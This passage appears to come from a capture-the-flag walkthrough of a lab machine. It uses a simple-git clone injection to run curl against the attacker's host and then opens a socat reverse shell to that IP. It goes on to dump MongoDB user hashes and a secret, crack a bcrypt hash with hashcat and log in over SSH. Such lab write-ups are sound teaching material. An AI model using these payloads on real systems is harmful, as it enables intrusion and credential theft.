</code></pre><p>We know that <a href="https://security.snyk.io/package/npm/simple-git">simple-git</a> has 2 RCE vulnerabilities that affect version <code>3.14</code>, one of which (<a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">SNYK-JS-SIMPLEGIT-3112221)</a> affects the <code>clone</code> method specifically:</p><figure class="kg-card kg-image-card"></figure><p>The <code>clone</code> function accepts the following arguments:</p><pre><code>git.clone(repoURL, localPath, options, handlerFn);</code></pre><p>We can assume that the <code>destinationUrl</code> we're sending in the POST request is being injected in the <code>repoURL</code> field, so let's try to modify the request to ping a local port:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{"destinationUrl":"ext::sh -c curl% http://10.10.14.69:9000% &gt;&amp;2"}</code></pre><pre><code>python3 -m http.server 9000
Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 16:49:49] "GET / HTTP/1.1" 200 -
</code></pre><p>Great, we can send commands to the machine!</p><p>Looking further into the <a href="https://git-scm.com/docs/git-remote-ext#_examples">documentation</a> that pertains to this "remote helper" (basically, the feature that supports the <code>ext::</code> syntax) we can see that we can also use <code>socat</code>, so let's try to use that to get a reverse shell:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
...

{"destinationUrl":"ext::socat TCP:10.10.14.69:4444 EXEC:'sh',pty,stderr,setsid,sigint,sane"}</code></pre><p>... and we get a shell!</p><p>Let's upgrade it: </p><pre><code class="language-bash">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><hr></hr><h2 id="from-foothold-to-user">From foothold to user</h2><pre><code>$ whoami
www-data

$ ls -la
...
dr-xr-xr-x  9 root     root     4096 Jul 28  2023 app
dr-xr-xr-x  3 root     root     4096 Feb 20 15:50 automation
dr-xr-xr-x  4 root     root     4096 Jul 29  2023 git-auto-update</code></pre><p>The <code>app</code> directory contains the source code for the NodeJS web application we just explored, which includes a <code>.env</code> file:</p><figure class="kg-card kg-code-card"><pre><code>PORT = 8082
URL_DATABASE="mongodb://localhost:27017"
SECRET=ThisIsTheN0deSecret
ADMIN_EMAIL="admin@chatbot.htb"</code></pre><figcaption>/var/www/app/.env</figcaption></figure><p>We can find more info about the MongoDB configuration in the <code>connect_db.js</code> file:</p><figure class="kg-card kg-code-card"><pre><code>import mongoose from "mongoose";

const connectDB= async(URL_DATABASE)=&gt;{
    try{
        const DB_OPTIONS={
            dbName : "testing"
        }
        mongoose.connect(URL_DATABASE,DB_OPTIONS)
        console.log("Connected Successfully TO Database")
    } catch(error){
        console.log(`Error Connecting to the ERROR ${error}`);
    }
}</code></pre><figcaption>/var/www/app/configuration/connect_db.js</figcaption></figure><p>As shown above, we don't need a password to be able to connect to the <code>testing</code> database.</p><pre><code>$ netstat -tunpl | grep 27017
tcp     0     0     127.0.0.1:27017     0.0.0.0:*     LISTEN     -

$ which mongo
/usr/bin/mongo

$ /usr/bin/mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?
[...]

&gt; show dbs;
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB

&gt; use testing;
switched to db testing

&gt; show collections;
messages
users

&gt; db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI1OTU2NDd9.iwgmNmvtm1s6WYvy4AbElQ1Hz3bvnd6UKkT2pHTntrs", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }</code></pre><p>So, we have an encrypted password for the <code>admin</code> user, but this is not super relevant since the unencrypted version is hardcoded in the source code, and we can confirm it's not valid for <code>SSH</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-javascript">// [...]
await page.goto('http://chatbot.htb/static/index.html', { timeout: 30000 });
// [...]
await page.type('#email', 'admin@chatbot.htb');
await page.type('#password', 'iamnottheadmin$');
// [...]</code></pre><figcaption>/var/www/automation/index.js</figcaption></figure><p>So this leaves us with the <code>frank_dorky</code> encrypted password:</p><pre><code>~ hashcat -a 0 -m 3200 frank_hash.txt rockyou-75.txt --status --status-timer=10 -w 3</code></pre><pre><code>~ ssh frank_dorky@chatbot.htb
frank_dorky@chatbot.htb's password:
&gt; manchesterunited

frank_dorky@formulax:~$</code></pre>

            </section>

        </article>
    </main>
    <footer class="page-footer">
        <h3></h3>
        <p><a href="../../index.html">Read more posts →</a></p>
        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
    </footer>
    
</body>
</html>
